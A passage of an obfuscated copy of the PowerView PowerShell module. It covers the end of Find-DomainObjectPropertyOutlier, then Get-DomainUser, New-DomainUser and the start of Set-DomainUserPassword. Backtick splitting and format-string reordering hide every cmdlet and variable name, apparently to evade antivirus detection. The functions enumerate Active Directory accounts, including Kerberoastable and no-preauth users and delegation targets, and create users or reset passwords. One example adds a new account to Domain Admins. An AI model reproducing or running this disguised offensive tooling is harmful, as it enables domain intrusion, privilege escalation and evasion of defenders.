        if (${P`sbo`UnDp`A`Ram`eteRS}['Domain']) {
            if (${PSbo`U`ND`pAra`meTErs}['Credential']) {
                ${TaRG`ET`F`Or`est} = &("{1}{2}{0}"-f 'main','Get-','Do') -Domain ${DOM`AIN} | &("{2}{1}{0}" -f'ct','je','Select-Ob') -ExpandProperty ("{1}{0}"-f'orest','F') | &("{2}{0}{1}" -f 'lec','t-Object','Se') -ExpandProperty ("{0}{1}"-f 'Nam','e')
            }
            else {
                ${targE`TfO`RE`ST} = &("{3}{2}{0}{1}"-f 'a','in','om','Get-D') -Domain ${D`OMAIN} -Credential ${C`ReDENt`iAL} | &("{3}{2}{1}{4}{0}"-f 'ect','ec','l','Se','t-Obj') -ExpandProperty ("{1}{0}" -f 't','Fores') | &("{0}{2}{3}{4}{1}" -f 'S','ct','el','ect-O','bje') -ExpandProperty ("{0}{1}" -f'N','ame')
            }
            &("{1}{0}{2}{3}"-f 'V','Write-','erbos','e') "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        ${ScHEmaa`RgUM`e`NtS} = @{}
        if (${P`sbou`NdPa`RamETErs}['Credential']) { ${S`c`H`e`MAArgUMeNtS}['Credential'] = ${C`RED`eNTI`Al} }
        if (${T`Arg`eTFOr`est}) {
            ${sche`maA`Rgum`ENts}['Forest'] = ${tARGE`T`FOR`eST}
        }
    }

    PROCESS {

        if (${PSb`Ou`Nd`p`ARAmetErs}['ReferencePropertySet']) {
            &("{1}{0}{2}" -f 'rite-Verbos','W','e') "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            ${R`e`FErenC`eob`J`ec`TProPERTies} = ${R`e`FERENcepR`oPERt`yS`ET}
        }
        elseif (${P`s`BOUN`DpARA`MetErs}['ReferenceObject']) {
            &("{0}{1}{2}"-f 'W','r','ite-Verbose') "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            ${re`F`eREn`CEOBJE`cT`P`RO`PeRtIEs} = &("{2}{1}{0}"-f 'mber','e','Get-M') -InputObject ${REFe`R`eNCE`oBj`EcT} -MemberType ("{0}{1}{2}" -f 'NoteProp','e','rty') | &("{2}{1}{4}{3}{0}"-f't','ect-O','Sel','jec','b') -Expand ("{1}{0}"-f 'me','Na')
            ${R`eFeren`CEobjeCT`cL`Ass} = ${r`EFe`ReNc`eObJ`ect}.objectclass | &("{1}{0}{2}" -f'Obj','Select-','ect') -Last 1
            &("{0}{1}{2}{3}" -f 'Writ','e-','Ve','rbose') "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            &("{0}{2}{1}"-f'Wr','rbose','ite-Ve') "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if ((${c`LAssNA`me} -eq 'User') -or (${R`eF`eRENCEObj`E`CtClASS} -eq 'User')) {
            ${o`B`jecTs} = &("{1}{4}{3}{0}{2}"-f'mainUse','Ge','r','-Do','t') @SearcherArguments
            if (-not ${R`EfErEnCeoBJ`E`ctP`RO`p`eRTIEs}) {
                ${REFEr`encEOB`jEct`PRoP`er`TiES} = ${u`S`eRREFEr`eNcEpRo`PErtYS`et}
            }
        }
        elseif ((${cL`A`ssNa`mE} -eq 'Group') -or (${R`EF`e`RE`NcEob`j`EctclASS} -eq 'Group')) {
            ${ob`j`eCTS} = &("{3}{1}{2}{0}"-f'up','-Doma','inGro','Get') @SearcherArguments
            if (-not ${R`EfereNceObjE`Ct`pRoPEr`T`i`ES}) {
                ${rEFE`R`EnceOBJE`ctp`ROper`TiEs} = ${G`Rou`p`RE`FEReNCePrOp`eRty`s`ET}
            }
        }
        elseif ((${cL`As`sNAmE} -eq 'Computer') -or (${ref`ere`NCe`ObJ`ec`T`claSS} -eq 'Computer')) {
            ${obJ`e`ctS} = &("{4}{2}{3}{0}{5}{1}" -f 'm','er','oma','inCo','Get-D','put') @SearcherArguments
            if (-not ${reFER`encE`ob`jEC`T`PrO`pE`RtIES}) {
                ${reFeR`ENc`eOb`jeCTpROpeRT`ieS} = ${coMPut`e`RRe`FEReNc`E`pRoPE`RTyseT}
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach (${o`BJ`ECt} in ${objE`C`Ts}) {
            ${oBJeC`Tp`ROpER`TiEs} = &("{2}{1}{0}" -f 'ber','t-Mem','Ge') -InputObject ${O`BJecT} -MemberType ("{2}{3}{0}{1}"-f 'r','ty','N','otePrope') | &("{2}{0}{1}" -f 'ct','-Object','Sele') -Expand ("{0}{1}" -f 'Na','me')
            ForEach(${oBJ`EC`T`pRO`PErtY} in ${Ob`J`E`CtPRop`erT`ieS}) {
                if (${refer`e`NCEO`Bje`ctpropEr`Ti`eS} -NotContains ${ObJeCTPr`O`P`ERTY}) {
                    ${O`Ut} = &("{1}{2}{0}" -f 't','Ne','w-Objec') ("{0}{2}{1}" -f'P','ect','SObj')
                    ${O`Ut} | &("{0}{1}{2}" -f 'Add-M','e','mber') ("{0}{2}{1}" -f'Not','property','e') 'SamAccountName' ${O`BJeCt}.SamAccountName
                    ${o`Ut} | &("{3}{0}{2}{1}" -f 'd-Mem','r','be','Ad') ("{1}{3}{2}{0}" -f'y','No','ert','teprop') 'Property' ${oBJE`C`TprO`PERTy}
                    ${o`UT} | &("{2}{1}{0}"-f'er','-Memb','Add') ("{0}{3}{2}{1}"-f 'N','y','pert','otepro') 'Value' ${oB`JecT}.${oBjeCt`P`Ro`pERTY}
                    ${o`Ut}.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    ${o`Ut}
                }
            }
        }
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function ge`T-`doMai`N`User {
<#
.SYNOPSIS

Return all users or specific user objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all user objects for
the current domain are returned.

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
Wildcards accepted. Also accepts DOMAIN\user format.

.PARAMETER SPN

Switch. Only return user objects with non-null service principal names.

.PARAMETER UACFilter

Dynamic parameter that accepts one or more values from $UACEnum, including
"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER AllowDelegation

Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

.PARAMETER DisallowDelegation

Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'

.PARAMETER TrustedToAuth

Switch. Return computer objects that are trusted to authenticate for other principals.

.PARAMETER PreauthNotRequired

Switch. Return user accounts with "Do not require Kerberos preauthentication" set.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainUser -Domain testlab.local

Return all users for the testlab.local domain

.EXAMPLE

Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"

Return the user with the given SID, as well as Administrator.

.EXAMPLE

'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff

lastlogoff                                   samaccountname
----------                                   --------------
12/31/1600 4:00:00 PM                        dfm.a
12/31/1600 4:00:00 PM                        dfm
12/31/1600 4:00:00 PM                        harmj0y
12/31/1600 4:00:00 PM                        Administrator

.EXAMPLE

Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation

Search the specified OU for privileged user (AdminCount = 1) that allow delegation

.EXAMPLE

Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon

Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon

.EXAMPLE

Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED

Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))

distinguishedname
-----------------
CN=user1,CN=Users,DC=dev,DC=testlab,DC=local

.INPUTS

String

.OUTPUTS

PowerView.User

Custom PSObject with translated user property fields.

PowerView.User.Raw

The raw DirectoryServices.SearchResult object, if -Raw is enabled.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUE}, ValueFromPipelineByPropertyName = ${T`RUe})]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        ${IDen`TI`TY},

        [Switch]
        ${S`pN},

        [Switch]
        ${adM`I`N`cOuNT},

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        ${AlLO`wdEL`EGAt`I`oN},

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        ${D`IsalLO`WdE`L`eg`A`TION},

        [Switch]
        ${TRU`s`TEdtoaUth},

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        ${p`Re`A`U`Th`NoTreq`UIreD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DOmA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${Ld`AP`FILteR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${proPE`R`Ti`es},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${SEa`RcHb`A`SE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${se`RV`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${SEa`R`chScOPE} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${re`S`ULTpAG`E`SizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`eRtIM`eLI`MIT},

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        ${Se`C`URIT`YMasKS},

        [Switch]
        ${T`O`Mbst`ONE},

        [Alias('ReturnOne')]
        [Switch]
        ${fiN`dO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`E`DEnT`IAL} = [Management.Automation.PSCredential]::Empty,

        [Switch]
        ${R`AW}
    )

    DynamicParam {
        ${uAcvaLue`N`AmES} = [Enum]::GetNames(${U`ACe`NUM})
        # add in the negations
        ${UaC`V`Alu`E`NaMES} = ${u`A`Cval`UE`NAMES} | &("{1}{0}{2}"-f'orE','F','ach-Object') {${_}; "NOT_$_"}
        # create new dynamic parameter
        &("{0}{2}{5}{1}{4}{3}"-f'New','cP','-Dynam','r','aramete','i') -Name ("{3}{1}{2}{0}"-f 'ter','ACF','il','U') -ValidateSet ${ua`Cva`LuE`N`AmEs} -Type ([array])
    }

    BEGIN {
        ${Sea`Rc`HErARgUmen`TS} = @{}
        if (${P`sbO`U`NdpaR`Amet`ERs}['Domain']) { ${SEar`ch`erar`G`UmENtS}['Domain'] = ${d`oM`AIn} }
        if (${ps`B`oUndP`Aram`eTe`RS}['Properties']) { ${sEA`RCH`ErArgUm`e`N`TS}['Properties'] = ${prOpEr`TI`es} }
        if (${pSB`o`U`Ndpar`AmetE`RS}['SearchBase']) { ${S`earcHe`R`ArGUMeNTS}['SearchBase'] = ${SEaRchb`A`se} }
        if (${PSbo`Un`dPARaME`TerS}['Server']) { ${s`EaRCheRarG`U`MeNts}['Server'] = ${SeRv`er} }
        if (${ps`B`OUndP`A`RAmeteRs}['SearchScope']) { ${S`e`ArcH`e`RArGUm`ENtS}['SearchScope'] = ${s`e`ArChSCO`Pe} }
        if (${P`sboU`ND`Pa`RameteRs}['ResultPageSize']) { ${SeaR`CHERa`Rg`UM`EnTs}['ResultPageSize'] = ${Res`ULtP`Ag`esi`Ze} }
        if (${PsboU`NdP`A`R`AMe`TERS}['ServerTimeLimit']) { ${se`ARCh`e`RaRguMentS}['ServerTimeLimit'] = ${S`ervERtI`Me`Li`MIT} }
        if (${PsBO`Un`Dp`ARAMetErS}['SecurityMasks']) { ${s`e`ARCHErar`guMENtS}['SecurityMasks'] = ${s`e`curIT`yM`ASKs} }
        if (${Psb`oUndpaR`A`me`TerS}['Tombstone']) { ${sEa`Rch`eraRG`UMeNtS}['Tombstone'] = ${T`oMBSt`ONE} }
        if (${PsBoUnD`pAR`A`mEteRs}['Credential']) { ${S`e`ARCHEr`ARgUMents}['Credential'] = ${CR`eDEnt`i`Al} }
        ${USe`R`SEarCh`ER} = &("{2}{4}{0}{1}{3}{5}"-f 'oma','i','Get-','nSearche','D','r') @SearcherArguments
    }

    PROCESS {
        #bind dynamic parameter to a friendly variable
        if (${pSBounDpaRa`m`ET`ers} -and (${Ps`Boun`DpaRam`e`TERs}.Count -ne 0)) {
            &("{3}{0}{1}{2}{4}"-f 'Dynamic','Para','mete','New-','r') -CreateVariables -BoundParameters ${psBoUnDPaRAM`E`T`e`RS}
        }

        if (${UsEr`s`eaRcHEr}) {
            ${IdENT`I`Tyf`ilter} = ''
            ${FI`lTEr} = ''
            ${Id`eNTI`TY} | &("{2}{3}{0}{1}"-f 're','-Object','W','he') {${_}} | &("{1}{0}{2}" -f'ch-Obj','ForEa','ect') {
                ${iDENTitY`I`NSTan`Ce} = ${_}.Replace('(', '\28').Replace(')', '\29')
                if (${iDeNt`it`y`iNStANce} -match '^S-1-') {
                    ${idENTi`T`YFILT`eR} += "(objectsid=$IdentityInstance)"
                }
                elseif (${idE`N`T`itY`inStA`NCE} -match '^CN=') {
                    ${I`DEntityf`Il`TeR} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${pS`BoUN`D`parAMe`T`erS}['Domain']) -and (-not ${P`sBoUnD`Pa`RAmETErs}['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        ${Id`entItyDO`Ma`in} = ${I`Den`TItY`I`NstA`NCE}.SubString(${I`D`enTITYinsTAn`ce}.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{2}{0}{1}" -f'rite-Verbos','e','W') "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        ${Se`ARChEr`ArG`UM`EntS}['Domain'] = ${IdEN`T`iTYDoma`IN}
                        ${U`SErs`EAr`chEr} = &("{4}{1}{0}{3}{2}"-f'e','mainS','her','arc','Get-Do') @SearcherArguments
                        if (-not ${uS`ER`SE`Ar`cHER}) {
                            &("{0}{2}{3}{1}"-f 'Wri','-Warning','t','e') "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif (${iDEnTI`TYIN`sta`N`CE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${gu`idbYtE`S`Tr`iNG} = (([Guid]${iDeN`T`It`yIns`TAncE}).ToByteArray() | &("{0}{1}{2}" -f 'ForEach-Ob','jec','t') { '\' + ${_}.ToString('X2') }) -join ''
                    ${IdeNtI`T`YfiL`TER} += "(objectguid=$GuidByteString)"
                }
                elseif (${i`deN`T`iTYInst`ANCE}.Contains('\')) {
                    ${cONv`ER`TedId`ENT`it`YiNst`ANCe} = ${IDE`NTity`I`NST`ANCe}.Replace('\28', '(').Replace('\29', ')') | &("{3}{1}{0}{2}" -f'DNam','t-A','e','Conver') -OutputType ("{2}{1}{0}" -f 'ical','n','Cano')
                    if (${CoNVE`RtE`dId`EN`TItyInST`A`N`ce}) {
                        ${USE`Rd`Om`AIn} = ${CoNV`e`Rt`eDIdENtItY`iN`sT`An`CE}.SubString(0, ${cO`Nv`ERTE`DiD`EnTiTYINsTANCE}.IndexOf('/'))
                        ${UsERN`A`me} = ${IDEn`Ti`TYI`NstanCe}.Split('\')[1]
                        ${i`dENTiT`y`FiL`TER} += "(samAccountName=$UserName)"
                        ${sEaRcheRAr`G`Um`En`Ts}['Domain'] = ${us`ERDom`A`iN}
                        &("{0}{1}{2}{3}"-f'Writ','e-V','er','bose') "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        ${UserSEa`R`cHEr} = &("{0}{2}{3}{1}{4}"-f 'Get','inSe','-D','oma','archer') @SearcherArguments
                    }
                }
                else {
                    ${i`dEnTiT`yfi`L`TeR} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${Id`EntitYfI`lt`er} -and (${I`de`N`TItYFilt`Er}.Trim() -ne '') ) {
                ${F`iLter} += "(|$IdentityFilter)"
            }

            if (${pSbOuNdP`A`RA`MetE`Rs}['SPN']) {
                &("{1}{2}{0}"-f 'rbose','Wri','te-Ve') '[Get-DomainUser] Searching for non-null service principal names'
                ${fi`LtER} += '(servicePrincipalName=*)'
            }
            if (${psb`ounD`pARAmE`Te`RS}['AllowDelegation']) {
                &("{1}{2}{0}{3}"-f 'erb','Write','-V','ose') '[Get-DomainUser] Searching for users who can be delegated'
                # negation of "Accounts that are sensitive and not trusted for delegation"
                ${f`iL`TER} += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
            }
            if (${pSbou`N`Dp`A`RAmEtErS}['DisallowDelegation']) {
                &("{0}{3}{2}{1}{4}" -f'Wr','-Verb','te','i','ose') '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
                ${f`IlT`eR} += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
            }
            if (${p`Sb`OuN`dPARam`EtE`RS}['AdminCount']) {
                &("{0}{1}{2}" -f'W','ri','te-Verbose') '[Get-DomainUser] Searching for adminCount=1'
                ${fi`l`TeR} += '(admincount=1)'
            }
            if (${psb`o`U`ND`PARAMETe`Rs}['TrustedToAuth']) {
                &("{2}{1}{0}" -f 'se','bo','Write-Ver') '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                ${f`I`LteR} += '(msds-allowedtodelegateto=*)'
            }
            if (${ps`Boun`d`pAr`AMETers}['PreauthNotRequired']) {
                &("{1}{2}{0}"-f 'se','Write-Ve','rbo') '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                ${fI`Lt`er} += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
            }
            if (${PSb`o`UNdpArAME`TE`Rs}['LDAPFilter']) {
                &("{1}{2}{3}{0}"-f'se','Writ','e-V','erbo') "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
                ${fI`L`Ter} += "$LDAPFilter"
            }

            # build the LDAP filter for the dynamic UAC filter value
            ${ua`CfI`LT`Er} | &("{1}{0}{2}{3}" -f 're','Whe','-O','bject') {${_}} | &("{1}{3}{0}{2}{4}"-f '-','ForEac','Obje','h','ct') {
                if (${_} -match 'NOT_.*') {
                    ${uaCfi`e`Ld} = ${_}.Substring(4)
                    ${ua`cval`Ue} = [Int](${UA`CEnuM}::${u`AcfIELd})
                    ${FI`LT`eR} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${u`ACv`ALUE} = [Int](${Ua`CE`NUm}::${_})
                    ${FIl`T`eR} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${us`er`SEaRch`ER}.filter = "(&(samAccountType=805306368)$Filter)"
            &("{2}{0}{3}{1}" -f 'rite-V','se','W','erbo') "[Get-DomainUser] filter string: $($UserSearcher.filter)"

            if (${PsBO`U`N`D`ParaMEterS}['FindOne']) { ${RE`s`ULTS} = ${uSeRS`Ea`R`c`HER}.FindOne() }
            else { ${R`es`UlTs} = ${Use`R`Se`Ar`CHer}.FindAll() }
            ${re`SU`ltS} | &("{2}{0}{3}{1}"-f'O','t','Where-','bjec') {${_}} | &("{0}{2}{3}{1}" -f 'For','ject','Each-','Ob') {
                if (${pSb`Ou`N`dPaRaMEtERS}['Raw']) {
                    # return raw result objects
                    ${US`Er} = ${_}
                    ${us`eR}.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                }
                else {
                    ${U`seR} = &("{3}{4}{5}{1}{2}{0}" -f'y','-LD','APPropert','C','on','vert') -Properties ${_}.Properties
                    ${uS`Er}.PSObject.TypeNames.Insert(0, 'PowerView.User')
                }
                ${us`ER}
            }
            if (${R`eSu`lTs}) {
                try { ${r`ESU`lTs}.dispose() }
                catch {
                    &("{2}{0}{1}" -f '-V','erbose','Write') "[Get-DomainUser] Error disposing of the Results object: $_"
                }
            }
            ${US`eRSEArch`Er}.dispose()
        }
    }
}


function new`-DOM`A`iNuS`eR {
<#
.SYNOPSIS

Creates a new domain user (assuming appropriate permissions) and returns the user object.

TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to create a new
DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.

.PARAMETER SamAccountName

Specifies the Security Account Manager (SAM) account name of the user to create.
Maximum of 256 characters. Mandatory.

.PARAMETER AccountPassword

Specifies the password for the created user. Mandatory.

.PARAMETER Name

Specifies the name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER DisplayName

Specifies the display name of the user to create. If not provided, defaults to SamAccountName.

.PARAMETER Description

Specifies the description of the user to create.

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword

Creates the 'harmj0y2' user with the specified description and password.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred

Creates the 'harmj0y2' user with the specified description and password, using the specified
alternate credentials.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred

Creates the 'andy' user with the specified description and password, using the specified
alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
and the alternate credentials.

.OUTPUTS

DirectoryServices.AccountManagement.UserPrincipal

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.UserPrincipal')]
    Param(
        [Parameter(Mandatory = ${t`RUe})]
        [ValidateLength(0, 256)]
        [String]
        ${sAM`ACCo`U`N`TnaME},

        [Parameter(Mandatory = ${tr`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias('Password')]
        [Security.SecureString]
        ${A`CcO`U`NtpASs`WORD},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Na`me},

        [ValidateNotNullOrEmpty()]
        [String]
        ${di`sp`lAYnaME},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`EScRi`P`TIOn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`m`AIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`ReD`e`NTiaL} = [Management.Automation.PSCredential]::Empty
    )

    ${CO`NT`ExtarGUMe`N`TS} = @{
        'Identity' = ${sAMaCc`OUN`TnAme}
    }
    if (${Psb`Ou`N`Dparame`TErS}['Domain']) { ${cO`Ntex`TAR`g`U`MENTs}['Domain'] = ${D`OM`AIn} }
    if (${PS`B`oU`NDpARA`MeT`ErS}['Credential']) { ${co`NTeXTAr`GUm`EntS}['Credential'] = ${C`REdEnTi`AL} }
    ${CoN`TEXT} = &("{5}{2}{4}{6}{0}{1}{3}"-f'al','Conte','r','xt','in','Get-P','cip') @ContextArguments

    if (${cONTe`xt}) {
        ${U`SER} = &("{0}{2}{1}"-f'New-O','ject','b') -TypeName ("{8}{6}{1}{9}{12}{2}{13}{4}{10}{5}{11}{0}{3}{7}"-f 'rP','.Dir','ry','rin','ice','AccountMan','stem','cipal','Sy','ect','s.','agement.Use','o','Serv') -ArgumentList (${CoNt`e`Xt}.Context)

        # set all the appropriate user parameters
        ${U`SEr}.SamAccountName = ${c`o`NTeXT}.Identity
        ${tE`MpcRED} = &("{1}{0}{2}" -f 'c','New-Obje','t') ("{1}{7}{2}{6}{3}{5}{0}{4}" -f'n.PSCred','System.Management.Au','m','t','ential','io','a','to')('a', ${A`ccOUnTP`Ass`WO`Rd})
        ${US`eR}.SetPassword(${T`E`mPCRed}.GetNetworkCredential().Password)
        ${us`Er}.Enabled = ${tR`Ue}
        ${u`sER}.PasswordNotRequired = ${F`ALsE}

        if (${pSBoU`Nd`pArAME`TE`RS}['Name']) {
            ${u`sEr}.Name = ${Na`Me}
        }
        else {
            ${US`Er}.Name = ${C`o`NTeXT}.Identity
        }
        if (${p`sB`o`UNd`ParAMETErs}['DisplayName']) {
            ${us`eR}.DisplayName = ${dIspL`A`YN`Ame}
        }
        else {
            ${u`Ser}.DisplayName = ${cO`NTEXt}.Identity
        }

        if (${PSbo`U`ND`P`ARaM`eteRs}['Description']) {
            ${uS`ER}.Description = ${deSCr`iPT`I`oN}
        }

        &("{0}{1}{2}"-f 'Wr','i','te-Verbose') "[New-DomainUser] Attempting to create user '$SamAccountName'"
        try {
            ${Nu`lL} = ${us`Er}.Save()
            &("{2}{1}{0}" -f'rbose','ite-Ve','Wr') "[New-DomainUser] User '$SamAccountName' successfully created"
            ${US`ER}
        }
        catch {
            &("{3}{1}{2}{0}"-f 'ng','r','ni','Write-Wa') "[New-DomainUser] Error creating user '$SamAccountName' : $_"
        }
    }
}


function S`e`T-dO`MAIn`US`ERpas`swOrd {
<#
.SYNOPSIS

Sets the password for a given user identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified user -Identity,
which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
SetPassword() function is then invoked on the user, setting the password to -AccountPassword.

.PARAMETER Identity

A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
specifying the user to reset the password for.

.PARAMETER AccountPassword

Specifies the password to reset the target user's to. Mandatory.

.PARAMETER Domain

Specifies the domain to use to search for the user identity, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword

